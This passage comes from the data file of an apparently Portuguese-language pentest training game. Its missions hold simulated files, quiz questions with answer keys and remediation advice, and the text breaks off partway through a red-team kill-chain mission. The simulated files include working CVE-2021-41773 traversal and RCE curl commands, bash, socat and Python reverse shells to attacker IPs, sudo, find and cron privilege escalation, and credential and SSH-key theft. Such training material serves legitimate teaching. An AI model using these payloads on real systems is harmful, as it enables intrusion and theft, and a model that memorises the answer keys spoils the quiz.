      risco: "Comprometimento total da base de usuários, acesso administrativo completo, potencial exfiltração de dados de clientes (LGPD Art. 48 — notificação obrigatória em 72h), acesso a outros sistemas com credenciais admin crackeadas.",
      como_corrigir: "1. Usar exclusivamente Prepared Statements/PDO — elimina SQL Injection por design\n2. Substituir MD5 por bcrypt (custo >= 12) ou Argon2id\n3. Salt único por usuário (bcrypt gera automaticamente)\n4. Desabilitar exibição de erros SQL em produção (display_errors=Off)\n5. Revogar e trocar TODAS as credenciais comprometidas\n6. WAF temporário como medida emergencial",
      boa_pratica: "SQL Injection está no OWASP Top 10 (A03:2021) há mais de uma década. Prevenção: NUNCA concatene input do usuário em queries — use sempre Prepared Statements. Ferramentas de teste: sqlmap (automatizado), Burp Suite Repeater (manual), OWASP ZAP. Para senhas: biblioteca bcrypt nativa de cada linguagem — bcryptjs no Node.js, password_hash() no PHP, passlib no Python."
    }
  },

  // ─── MISSÃO 21 ────────────────────────────────────────────────────────────
  {
    id: 21,
    titulo: "Shell Reversa — Exploração de Serviço",
    subtitulo: "CVE-2021-41773: do Path Traversal ao Remote Code Execution",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🐚",
    contexto: `Apache 2.4.49 confirmado como vulnerável ao <strong>CVE-2021-41773</strong>.
Hora de explorar: primeiro Path Traversal para obter arquivos críticos,
depois Remote Code Execution para estabelecer uma <strong>shell reversa no servidor</strong>.
Tudo dentro do escopo autorizado e documentado.`,
    dica: "Leia <code>cat exploit_traversal.txt</code> para o Path Traversal, depois <code>cat rce_shell.txt</code> e <code>cat stabilize_shell.txt</code>.",
    filesystem: {
      "/": ["home", "opt", "var"],
      "/home": ["hacker"],
      "/home/hacker": ["exploit_traversal.txt", "rce_shell.txt", "netcat_listener.txt", "stabilize_shell.txt"],
      "/opt": ["exploits"],
      "/opt/exploits": ["cve-2021-41773.py"],
      "/var": ["log"],
      "/var/log": ["pentest.log"],
    },
    files: {
      "/home/hacker/exploit_traversal.txt": `# CVE-2021-41773 -- Path Traversal no Apache 2.4.49
# CVSS 7.5 (Path Traversal) -> 9.8 (com RCE via mod_cgi)
# Afeta: Apache 2.4.49 APENAS (corrigido no 2.4.51)

=== COMO FUNCIONA ===
O Apache 2.4.49 tem falha na normalizacao de URLs.
A sequencia "%2e%2e/" (../ URL-encoded de forma mista)
nao e normalizada antes da verificacao de seguranca.
Resultado: o path traversal passa pela protecao mas e
interpretado como "../" pelo sistema de arquivos.

=== TESTE 1: Ler /etc/passwd ===
curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

RESPOSTA:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
carlos:x:1001:1001:Carlos Mendes,,,:/home/carlos:/bin/bash
mysql:x:110:115:MySQL Server,,,:/var/lib/mysql:/bin/false

-> SUCESSO! Lemos /etc/passwd sem autenticacao!

=== TESTE 2: Chave SSH privada do usuario carlos ===
curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/carlos/.ssh/id_rsa"

RESPOSTA:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn...
[CHAVE SSH PRIVADA COMPLETA OBTIDA]
-----END OPENSSH PRIVATE KEY-----

-> CRITICO: chave privada SSH exposta!
-> ssh -i id_rsa carlos@192.168.10.50 funciona sem senha.

=== TESTE 3: Credenciais do banco no config.php ===
curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/var/www/html/config.php"

RESPOSTA:
<?php
$db_host = "localhost";
$db_user = "appuser";
$db_pass = "S3cr3t@DB2024";
$db_name = "targetcorp_db";
?>

-> Credenciais do banco expostas via Path Traversal!`,

      "/home/hacker/rce_shell.txt": `# CVE-2021-41773 -- Remote Code Execution via mod_cgi
# Requisito: mod_cgi ativo (comum em servidores legados)

=== VERIFICAR SE mod_cgi ESTA ATIVO ===
curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/apache2/mods-enabled/"
-> Listagem inclui: cgi.load, cgi.conf -- mod_cgi confirmado!

=== TESTE RCE: Executar comando no servidor ===
curl -s --path-as-is -d "echo;id" \\
  "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

RESPOSTA:
Content-type: text/html

uid=33(www-data) gid=33(www-data) groups=33(www-data)

-> EXECUCAO DE CODIGO REMOTO CONFIRMADA!
-> Executando como: www-data (usuario do Apache)

=== SHELL REVERSA (payload completo) ===
# Passo 1: na maquina atacante (Kali), iniciar listener
nc -lvnp 4444

# Passo 2: enviar payload de shell reversa
curl -s --path-as-is \\
  -d "echo;bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" \\
  "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

-> Conexao entrante no listener!
-> Shell reversa estabelecida como www-data.`,

      "/home/hacker/netcat_listener.txt": `# Maquina atacante (Kali Linux)
# Antes de enviar o payload, configurar listener:

$ nc -lvnp 4444
Listening on 0.0.0.0 4444

# Apos enviar o payload curl:
Connection received on 192.168.10.50 54321

bash: no job control in this shell
www-data@targetcorp:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@targetcorp:/usr/lib/cgi-bin$ whoami
www-data

www-data@targetcorp:/usr/lib/cgi-bin$ uname -a
Linux targetcorp 4.15.0-154-generic x86_64 GNU/Linux

*** SHELL OBTIDA! Acesso inicial como www-data ***
*** Proximo passo: estabilizar a shell e escalar privilegios ***`,

      "/home/hacker/stabilize_shell.txt": `# Shell reversa raw (netcat) e instavel:
# - Ctrl+C mata o listener inteiro (perde acesso)
# - Setas mostram ^[[A em vez de navegar historico
# - Tab nao funciona
# - sudo e programas interativos falham

=== METODO 1: Python PTY (mais comum) ===
# No shell www-data recebido:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z para suspender o processo nc
# No terminal Kali:
stty raw -echo; fg

# De volta ao shell www-data:
export TERM=xterm
stty rows 40 cols 200

-> Shell estavel com:
   OK Setas e historico funcionando
   OK Tab completion
   OK Ctrl+C funcional
   OK sudo e mysql nao falham

=== METODO 2: socat (shell completa desde o inicio) ===
# Kali (listener):
socat file:\`tty\`,raw,echo=0 tcp-listen:4444

# No servidor (via curl RCE):
echo;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.100:4444

=== METODO 3: rlwrap (mais simples) ===
# Kali:
rlwrap nc -lvnp 4444
# Adiciona historico e setas sem estabilizacao extra`,
    },
    perguntas: [
      {
        id: 1,
        texto: "O exploit usa '.%2e/' em vez de '../'. Por que essa codificação bypassa a proteção do Apache 2.4.49?",
        opcoes: [
          { id: "a", texto: "O Apache não verifica URLs com caracteres especiais codificados" },
          { id: "b", texto: "O Apache 2.4.49 não normaliza '%2e' para '.' antes de verificar o path — a proteção busca por '../' literal, mas o filesystem interpreta '.%2e/' como '../' depois da verificação" },
          { id: "c", texto: "O Apache ignora tudo que vem após '/cgi-bin/'" },
          { id: "d", texto: "É uma falha no protocolo HTTP, não no Apache" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Análise correta da falha! CVE-2021-41773 é uma falha de normalização: o Apache 2.4.49 verificava segurança buscando '../' literal, mas não decodificava '%2e' antes dessa verificação. Então '.%2e/' passa pela proteção, mas é interpretado como '../' pelo sistema de arquivos — path traversal bem-sucedido. Corrigido no 2.4.51 com normalização completa antes de qualquer verificação.",
        feedback_errado: "CVE-2021-41773 explora uma falha de sequência de operações: '%2e' é o ponto '.' codificado em URL. O Apache 2.4.49 verificava se a URL continha '../' ANTES de decodificar completamente o path. Então '.%2e/' não é reconhecido como '../' na verificação, mas o filesystem o interpreta como '../' quando resolve o arquivo — escapando do DocumentRoot."
      },
      {
        id: 2,
        texto: "O rce_shell.txt usa o corpo da requisição 'echo;id' para executar o comando 'id'. Por que o 'echo;' é necessário antes do comando?",
        opcoes: [
          { id: "a", texto: "Para imprimir uma mensagem de status antes do resultado" },
          { id: "b", texto: "CGI requer que a saída comece com headers HTTP — 'echo' sem argumentos imprime uma linha vazia que funciona como separador de headers, sem ela o Apache retorna erro 500" },
          { id: "c", texto: "Para separar os comandos em dois processos diferentes" },
          { id: "d", texto: "O 'echo' instrui o shell a executar o próximo comando como root" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Detalhe técnico importante de CGI! O protocolo CGI exige que a saída do script comece com headers HTTP seguidos de uma linha em branco. 'echo' sem argumentos imprime exatamente uma linha vazia — o Apache interpreta como o separador headers/body. Sem isso: erro 500. Com 'echo;id': linha vazia = fim dos headers, output de 'id' = body da resposta HTTP.",
        feedback_errado: "CGI (Common Gateway Interface) requer que a saída do script siga o formato HTTP: headers, linha vazia, corpo. 'echo' sem argumentos imprime somente uma linha vazia — isso satisfaz o requisito mínimo de header (o Apache aceita uma linha em branco como 'sem headers adicionais'). Sem essa linha vazia: Apache retorna erro 500 Internal Server Error e não repassa a saída."
      },
      {
        id: 3,
        texto: "Por que uma shell reversa raw de netcat precisa ser 'estabilizada' com python3 + pty?",
        opcoes: [
          { id: "a", texto: "Apenas por questão estética — a shell funciona igual sem estabilização" },
          { id: "b", texto: "Shell raw sem PTY: Ctrl+C fecha o netcat inteiro (perde o acesso), setas exibem sequências de escape cruas, Tab não funciona, sudo e programas interativos falham — pty.spawn cria um pseudo-terminal completo" },
          { id: "c", texto: "A estabilização criptografa o tráfego da shell" },
          { id: "d", texto: "Somente para evitar detecção pelo IDS" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Problema real e prático! Shell via netcat sem PTY: Ctrl+C mata o listener (perde o acesso!), setas mostram '^[[A' ao invés de navegar pelo histórico, Tab exibe o caractere literal, sudo falha ('no tty present'), mysql -u root -p não funciona. python3 -c 'import pty; pty.spawn(\"/bin/bash\")' cria um pseudo-terminal real, transformando a conexão netcat em algo próximo de um SSH.",
        feedback_errado: "Shell netcat sem PTY é extremamente limitada em operação real: Ctrl+C encerra o netcat inteiro (perda de acesso!), setas de navegação mostram sequências de escape cruas, Tab não completa comandos, sudo e qualquer programa que precise de terminal interativo falha. pty.spawn cria um pseudo-terminal que resolve todos esses problemas — shell funcional como um SSH."
      },
      {
        id: 4,
        texto: "O Path Traversal expôs a chave SSH privada de carlos (~/.ssh/id_rsa). Como obter acesso SSH estável usando essa chave?",
        opcoes: [
          { id: "a", texto: "Copiar a chave e enviar ao cliente como evidência por e-mail" },
          { id: "b", texto: "Salvar a chave localmente, chmod 600 id_rsa (obrigatório), e conectar com: ssh -i id_rsa carlos@192.168.10.50 — shell SSH completa sem senha" },
          { id: "c", texto: "A chave privada sozinha não é suficiente para autenticar por SSH" },
          { id: "d", texto: "Importar a chave no browser para acesso ao painel web" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Processo correto! (1) curl salva a chave: curl 'http://.../path_traversal.../home/carlos/.ssh/id_rsa' -o id_rsa, (2) chmod 600 id_rsa — OBRIGATÓRIO: SSH rejeita chaves com permissões abertas com erro 'unprotected private key file', (3) ssh -i id_rsa carlos@192.168.10.50 — autenticação por chave, sem senha. SSH é preferível à shell reversa: estável, sem timeout, TTY completo.",
        feedback_errado: "Para usar chave SSH: (1) salvar o conteúdo da chave em arquivo local (id_rsa), (2) chmod 600 id_rsa — sem isso o SSH recusa com 'permissions are too open', (3) ssh -i id_rsa carlos@192.168.10.50 — autentica com a chave privada. SSH é muito mais estável que shell reversa: persiste por horas, TTY completo, sem problemas de estabilização, e é o acesso preferido em engajamentos de red team."
      }
    ],
    conclusao: {
      o_que_aconteceu: "CVE-2021-41773 no Apache 2.4.49 permitiu Path Traversal para leitura de arquivos críticos (/etc/passwd, chave SSH privada de carlos, config.php com senha do banco) e — com mod_cgi ativo — Remote Code Execution completo resultando em shell reversa como www-data.",
      vulnerabilidade: "CVE-2021-41773 (CVSS 9.8): falha de normalização de URL no Apache 2.4.49. Agravado por: mod_cgi ativo desnecessariamente, chave SSH sem passphrase exposta, credenciais de banco de dados em arquivo web-acessível.",
      risco: "Acesso inicial (foothold) estabelecido como www-data. Com chave SSH de carlos: acesso SSH estável. Com credenciais do banco: acesso a dados. Próximo passo natural: escalada de privilégios para root.",
      como_corrigir: "1. Atualizar Apache para 2.4.51+ (patch do CVE) — atualização emergencial\n2. Desabilitar mod_cgi se não necessário ('a2dismod cgi')\n3. Proteger chaves SSH com passphrase obrigatória\n4. Armazenar credenciais de banco fora do webroot (variáveis de ambiente ou .env fora de /var/www)\n5. Adicionar 'Require all denied' como default no Apache",
      boa_pratica: "CVEs críticos explorados in-the-wild devem ser patchados em 24-72h. CVE-2021-41773 foi descoberto e explorado massivamente em outubro de 2021. Metasploit tem módulo pronto: exploit/multi/http/apache_normalize_path_rce. Defense-in-depth: WAF com regras para '%2e' em paths, monitoramento de logs Apache para padrões suspeitos, e alertas para acessos a /etc/passwd e arquivos fora do webroot."
    }
  },

  // ─── MISSÃO 22 ────────────────────────────────────────────────────────────
  {
    id: 22,
    titulo: "Escalada de Privilégios — Linux",
    subtitulo: "De www-data a root: sudo, SUID e crontab malconfigurado",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "⬆️",
    contexto: `Shell estabelecida como <strong>www-data</strong> — usuário de baixo privilégio do Apache.
Para comprometimento total do servidor, você precisa escalar para <strong>root</strong>.
Execute enumeração sistemática com LinPEAS: analise sudo, binários SUID, crontabs e arquivos graváveis.
<em>Autorização cobre escalada de privilégios no servidor 192.168.10.50.</em>`,
    dica: "Comece com <code>cat linpeas_resumo.txt</code> para o overview, depois <code>cat sudo_l.txt</code>, <code>cat crontab_root.txt</code> e <code>cat exploit_sudo.txt</code>.",
    filesystem: {
      "/": ["home", "opt", "var", "etc"],
      "/home": ["hacker"],
      "/home/hacker": ["linpeas_resumo.txt", "sudo_l.txt", "suid_bins.txt", "crontab_root.txt", "writable_files.txt", "exploit_sudo.txt"],
      "/opt": ["backup"],
      "/opt/backup": ["backup.sh"],
      "/etc": ["crontab"],
      "/var": ["log"],
      "/var/log": ["pentest.log"],
    },
    files: {
      "/home/hacker/linpeas_resumo.txt": `# LinPEAS -- Linux Privilege Escalation Awesome Script
# Rodado como www-data em targetcorp
# Resumo dos achados mais criticos

=== Sudo version ===
Sudo 1.8.31p1 -- CVE-2021-3156 pode ser aplicavel

=== Sudo commands (CRITICO) ===
www-data pode rodar como root SEM SENHA:
  (root) NOPASSWD: /usr/bin/find
  (root) NOPASSWD: /usr/bin/python3.8
  !! VETORES DE ESCALADA IDENTIFICADOS !!

=== SUID binaries ===
Binarios com bit SUID (executam como dono = root):
  /usr/bin/python3.8  <- GTFOBins!
  /usr/bin/find       <- GTFOBins!
  /usr/bin/pkexec     <- CVE-2021-4034 (PwnKit)!
  /usr/bin/passwd
  /usr/bin/sudo
  /bin/su

=== Interesting files ===
  /opt/backup/backup.sh  <- GRAVAVEL por www-data!
                            Executado por cron como ROOT!
  Permissoes: -rwxrwxrwx (777 -- todos podem escrever)`,

      "/home/hacker/sudo_l.txt": `# Comando executado: sudo -l
# (como www-data, sem necessidade de senha)

Matching Defaults entries for www-data on targetcorp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on targetcorp:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/python3.8

# CRITICO: www-data pode executar find e python3.8 como root SEM SENHA!
# Referencia: GTFOBins -- https://gtfobins.github.io/`,

      "/home/hacker/suid_bins.txt": `# Comando: find / -perm -4000 -type f 2>/dev/null
# Busca binarios com SUID bit ativo (executam como root)

/usr/bin/python3.8   <- sudo + SUID = root garantido
/usr/bin/find        <- sudo + SUID = root garantido
/usr/bin/pkexec      <- CVE-2021-4034 (PwnKit) -- local privesc
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/bin/su
/bin/mount
/usr/sbin/exim4

# NOTA: pkexec vulneravel ao CVE-2021-4034 (publicado jan/2022)
# Existe desde 2009, afeta todas as distros Linux`,

      "/home/hacker/crontab_root.txt": `# Comando: cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user    command
17  *   *   *   *   root    run-parts /etc/cron.hourly
25  6   *   *   *   root    run-parts /etc/cron.daily

# Backup automatizado -- executado como ROOT a cada 5 minutos
*/5  *   *   *   *   root    /opt/backup/backup.sh

# VULNERABILIDADE CRITICA:
# /opt/backup/backup.sh e executado como ROOT
# mas tem permissao 0777 -- www-data pode ESCREVER nesse arquivo!
# Escrever payload no script -> cron executa como root -> privesc!`,

      "/home/hacker/writable_files.txt": `# Verificacao de permissoes do script de backup:
# ls -la /opt/backup/backup.sh

-rwxrwxrwx 1 root root 247 Feb 01 10:30 /opt/backup/backup.sh
#  ^-- 777 = TODOS podem ler, escrever e executar!

# Conteudo atual do script:
#!/bin/bash
tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz /var/www/html/
echo "Backup concluido" >> /var/log/backup.log

# VETOR DE ATAQUE:
# 1. Sobrescrever backup.sh com payload malicioso
# 2. Aguardar cron executar (maximo 5 minutos)
# 3. Cron executa backup.sh como root
# 4. Payload executa como root -> escalada completa!`,

      "/home/hacker/exploit_sudo.txt": `# EXPLOIT 1: sudo find -> root (MAIS RAPIDO -- resultado imediato)
# GTFOBins: https://gtfobins.github.io/gtfobins/find/

$ sudo find . -exec /bin/bash -p \\;

bash-5.0# id
uid=0(root) gid=0(root) groups=0(root)

bash-5.0# whoami
root

# ROOT OBTIDO EM 1 COMANDO!

# EXPLOIT 2: sudo python3.8 -> root
$ sudo python3.8 -c 'import os; os.system("/bin/bash")'

bash-5.0# id
uid=0(root) gid=0(root) groups=0(root)

# EXPLOIT 3: crontab gravavel -> root (ate 5 minutos)
$ echo 'chmod u+s /bin/bash' >> /opt/backup/backup.sh
# Aguardar cron executar...
# Depois:
$ /bin/bash -p
bash-5.0# id
uid=0(root) gid=0(root)

# VERIFICACAO FINAL (root pode ler /etc/shadow):
$ cat /etc/shadow
root:$6$rounds=656000$salt$hash -- agora legivel!
# Hash pode ser crackeado offline com hashcat`,
    },
    perguntas: [
      {
        id: 1,
        texto: "O sudo_l.txt mostra: (root) NOPASSWD: /usr/bin/find. Usando GTFOBins, qual comando escala para root IMEDIATAMENTE?",
        opcoes: [
          { id: "a", texto: "sudo find / -name '*.conf'" },
          { id: "b", texto: "sudo find . -exec /bin/bash -p \\; — executa bash como root via -exec do find" },
          { id: "c", texto: "sudo find /etc/passwd -readable -print" },
          { id: "d", texto: "find / -perm -4000 -type f 2>/dev/null" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Exploit GTFOBins perfeito! sudo find . -exec /bin/bash -p \\; funciona porque: (1) find executa como root via sudo NOPASSWD, (2) -exec permite executar qualquer comando para cada arquivo encontrado, (3) /bin/bash -p abre bash em modo privilegiado mantendo o EUID=0 do sudo. Resultado: shell root imediata, em um único comando. GTFOBins.github.io documenta esse padrão para 300+ binários.",
        feedback_errado: "sudo find . -exec /bin/bash -p \\; é o exploit GTFOBins para find: (1) sudo eleva para root (NOPASSWD = sem senha), (2) -exec /bin/bash executa bash como root para cada arquivo, (3) -p (privileged mode) impede o bash de resetar o EUID para o usuário original. Resultado: bash interativo como root. GTFOBins documenta vetores de exploração para find, python, vim, nano, e centenas de outros binários."
      },
      {
        id: 2,
        texto: "O crontab_root.txt mostra /opt/backup/backup.sh executado como ROOT a cada 5 min, com permissão 0777. Como explorar isso?",
        opcoes: [
          { id: "a", texto: "Ler o backup para encontrar dados sensíveis no arquivo comprimido" },
          { id: "b", texto: "Escrever um payload no backup.sh (ex: chmod u+s /bin/bash) e aguardar o cron executar como root — o payload rodará com privilégios root em até 5 minutos" },
          { id: "c", texto: "Deletar o arquivo backup.sh para parar o cron e causar erro" },
          { id: "d", texto: "Modificar o crontab para executar com menos frequência" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Crontab privesc clássico! Ataque: echo 'chmod u+s /bin/bash' >> /opt/backup/backup.sh → aguardar até 5 min → /bin/bash -p → shell root. O cron executa o script como root, mas www-data pode modificar o arquivo (0777). Motivo: separação inadequada de privilégios — scripts executados por root devem pertencer ao root e ter permissão 700 ou 750.",
        feedback_errado: "Script executado por cron como root + modificável por usuário não-privilegiado = escalada garantida. www-data escreve payload no script → cron executa como root → payload roda com privilégio root. Payloads típicos: (1) 'chmod u+s /bin/bash' → /bin/bash -p dá shell root, (2) bash reversa direta no script → receber shell root no listener. Prevenção: chmod 700 /opt/backup/backup.sh && chown root:root /opt/backup/backup.sh."
      },
      {
        id: 3,
        texto: "Após obter root, qual é a PRIMEIRA ação obrigatória em um pentest ético profissional?",
        opcoes: [
          { id: "a", texto: "Instalar um backdoor persistente para garantir acesso durante todo o engajamento" },
          { id: "b", texto: "Documentar a escalada com evidências mínimas (id, whoami, hostname, data/hora), notificar o cliente do comprometimento total, e não executar ações além do escopo" },
          { id: "c", texto: "Extrair /etc/shadow completo e crackear todas as hashes offline para o relatório" },
          { id: "d", texto: "Criar uma conta administrativa oculta para acesso de longo prazo" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Conduta ética essencial! Ao obter root em pentest: (1) Screenshot/log de 'id && whoami && hostname && date' como prova mínima, (2) notificar o cliente imediatamente — comprometimento total é finding crítico que não espera o relatório, (3) parar ou reduzir exploração ao mínimo necessário para prova — sem exfiltrar dados reais, sem instalar backdoors persistentes que fiquem após o teste, sem ações irreversíveis.",
        feedback_errado: "Após root em pentest ético: (1) DOCUMENTAR com evidências mínimas — 'id; whoami; hostname; date' capturado em screenshot é suficiente para provar o achado, (2) NOTIFICAR imediatamente o cliente — comprometimento total exige comunicação urgente, (3) NÃO instalar backdoors permanentes (problema legal para ambos), (4) NÃO exfiltrar dados reais, (5) NÃO executar ações irreversíveis. Objetivo: provar o risco, não maximizar o dano."
      },
      {
        id: 4,
        texto: "O suid_bins.txt lista /usr/bin/pkexec com SUID. Isso está relacionado com qual CVE crítico que afeta virtualmente todos os Linux desde 2009?",
        opcoes: [
          { id: "a", texto: "CVE-2021-41773 — path traversal no Apache httpd" },
          { id: "b", texto: "CVE-2021-4034 (PwnKit / Polkit) — buffer overflow no pkexec permitindo escalada local para root por qualquer usuário, presente desde 2009, CVSS 7.8" },
          { id: "c", texto: "CVE-2022-0847 (Dirty Pipe) — sobrescrita de arquivos read-only via pipe do kernel" },
          { id: "d", texto: "CVE-2021-3156 (Baron Samedit) — heap overflow no sudo" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "CVE-2021-4034 (PwnKit): pkexec é o SUID binary do Polkit, presente em praticamente todas as distros Linux. Buffer overflow no parsing de argv permite escalada local para root — qualquer usuário local sem senha ou privilégios. Descoberto pela Qualys em janeiro de 2022, existe desde a versão 0.105 de 2009. Exploit PoC público em horas após o disclosure, afetou Red Hat, Ubuntu, Debian, Fedora, CentOS...",
        feedback_errado: "CVE-2021-4034 é o PwnKit: pkexec (/usr/bin/pkexec) tem buffer overflow no parsing de argv[], presente desde 2009 (versão 0.105 do Polkit). Qualquer usuário local escala para root sem senha. Afetou TODAS as distros Linux. Exploit PoC público lançado horas após a divulgação em jan/2022 — patch obrigatório urgente. Diferente do Dirty Pipe (CVE-2022-0847) que é falha de kernel, não de userspace."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Escalada de privilégios completa de www-data para root via múltiplos vetores: sudo NOPASSWD para find/python3.8 (exploit GTFOBins em 1 comando), crontab executando script com permissão 0777 (privesc via modificação do script), e binário pkexec vulnerável ao CVE-2021-4034.",
      vulnerabilidade: "Princípio do menor privilégio completamente violado: www-data com sudo NOPASSWD para binários que permitem execução arbitrária (find, python), cron jobs rodando como root com scripts graváveis por usuários não-privilegiados, binário SUID pkexec desatualizado com CVE público.",
      risco: "Controle total do servidor (root): leitura de /etc/shadow (hashes de todas as senhas), instalação de rootkits, modificação de qualquer binário do sistema, acesso a todos os dados, e pivoting para rede interna com credenciais de root.",
      como_corrigir: "1. Remover entradas sudo NOPASSWD ou restringir a scripts controlados sem execução arbitrária\n2. Corrigir permissões de scripts cron: chmod 700 && chown root:root /opt/backup/backup.sh\n3. Remover SUID de binários não essenciais: chmod u-s /usr/bin/python3.8\n4. Atualizar polkit para corrigir CVE-2021-4034\n5. Executar LinPEAS/WinPEAS periodicamente como parte do hardening",
      boa_pratica: "Enumeração de privesc: LinPEAS (github.com/carlospolop/PEASS-ng) automatiza a busca de vetores em Linux. GTFOBins (gtfobins.github.io) documenta como 300+ binários Unix comuns podem ser explorados para escalada. Princípio do menor privilégio: nenhum processo deve ter mais permissões do que o estritamente necessário. 'sudo -l' e 'find / -perm -4000' devem ser parte da auditoria de segurança regular."
    }
  },

  // ─── MISSÃO 23 ────────────────────────────────────────────────────────────
  {
    id: 23,
    titulo: "Red Team Completo — Operação Shadow",
    subtitulo: "Kill chain end-to-end: recon → acesso → escalada → pivoting → relatório",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 300,
    icone: "🎯",
    contexto: `<strong>Missão final.</strong> Você lidera um exercício de Red Team completo contra a <strong>FinSecure Bank S.A.</strong>
Contrato assinado, escopo definido: IP range 200.100.50.0/24 e rede interna 10.10.10.0/24.
Execute a kill chain completa: Reconhecimento → Acesso Inicial → Escalada → Persistência → Movimento Lateral → Exfiltração → Relatório.
<em>Duração simulada: 72 horas de operação encoberta e documentada.</em>`,
    dica: "Leia os arquivos em sequência para seguir a kill chain. Comece com <code>cat fase1_recon.txt</code>.",
    filesystem: {
      "/": ["home", "opt", "var"],
      "/home": ["redteam"],
      "/home/redteam": ["fase1_recon.txt", "fase2_acesso.txt", "fase3_privesc.txt", "fase4_persistencia.txt", "fase5_lateral.txt", "fase6_exfiltracao.txt", "relatorio_executivo.txt"],
      "/opt": ["tools"],
      "/opt/tools": ["mimikatz_output.txt", "bloodhound_summary.txt"],
      "/var": ["log"],
      "/var/log": ["redteam_timeline.txt"],
    },
    files: {
      "/home/redteam/fase1_recon.txt": `# FASE 1 -- RECONHECIMENTO (Horas 0-8)
# Kill Chain: Reconnaissance

=== RECONHECIMENTO PASSIVO (zero trafego no alvo) ===
$ theHarvester -d finsecure.com.br -b all

Emails encontrados:
  ti@finsecure.com.br
  carlos.admin@finsecure.com.br   <- admin identificado!
  helpdesk@finsecure.com.br

Hosts encontrados:
  vpn.finsecure.com.br    -> 200.100.50.10
  mail.finsecure.com.br   -> 200.100.50.11
  dev.finsecure.com.br    -> 200.100.50.20  <- servidor dev!
  old.finsecure.com.br    -> 200.100.50.99  <- servidor antigo!

$ shodan host 200.100.50.20
Ports: 22, 80, 443, 3306
Server: Apache/2.4.49 (Ubuntu)   <- CVE-2021-41773!

$ shodan host 200.100.50.99
Ports: 21, 22, 80, 8888
Server: Apache/2.2.14
Jupyter Notebook: 8888/tcp -- SEM AUTENTICACAO!   <- RCE direto!

=== RECONHECIMENTO ATIVO (apos autorizacao formal) ===
$ nmap -sV -sC --script=vuln 200.100.50.0/24

Achados criticos:
  200.100.50.20:80  -- CVE-2021-41773 VULNERABLE (CVSS 9.8)
  200.100.50.99:8888 -- Jupyter sem auth -> RCE imediato
  200.100.50.10:443  -- VPN Pulse Secure -- verificar CVEs`,

      "/home/redteam/fase2_acesso.txt": `# FASE 2 -- ACESSO INICIAL (Horas 8-16)
# Kill Chain: Weaponization + Delivery + Exploitation

=== VETOR 1: Jupyter Notebook sem autenticacao ===
# Acesso via browser: http://200.100.50.99:8888
# Criar novo notebook Python -- sem solicitar senha!

import subprocess
result = subprocess.check_output(['id'], text=True)
# uid=1000(jupyter) gid=1000(jupyter)

# Shell reversa via Jupyter Python:
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("200.100.1.100",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])

-> Shell obtida: jupyter@old-server (uid=1000)

=== VETOR 2: CVE-2021-41773 no dev server ===
curl --path-as-is -d "echo;id" \\
  "http://200.100.50.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
-> uid=33(www-data) -- RCE confirmado

=== VETOR 3: Spear Phishing (engenharia social) ===
# carlos.admin@finsecure.com.br identificado no OSINT
# E-mail crafted com pretexto de alerta de segurança urgente:
From: security-notice@finsecure-alert.com.br  <- typosquatting
To: carlos.admin@finsecure.com.br
Subject: [URGENTE] Vulnerabilidade Critica -- Acao Requerida

-> Carlos clicou no link malicioso -- credenciais capturadas!
-> carlos.admin / Fin@2024Secure#`,

      "/home/redteam/fase3_privesc.txt": `# FASE 3 -- ESCALADA DE PRIVILEGIOS (Horas 16-24)
# Kill Chain: Installation (gaining higher access)

=== NO OLD-SERVER (jupyter, uid=1000) ===
$ sudo -l
(root) NOPASSWD: /usr/bin/python3

$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@old-server:~# id
uid=0(root) gid=0(root)
-> ROOT obtido via sudo python3!

# Extrair /etc/shadow para crackear offline:
root@old-server:~# cat /etc/shadow

# Chave SSH do root encontrada:
root@old-server:~# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[chave privada do root -- possivelmente reutilizada em outros servidores]

=== NO DEV-SERVER (www-data) ===
$ sudo find . -exec /bin/bash -p \\;
bash-5.0# id
uid=0(root) gid=0(root)
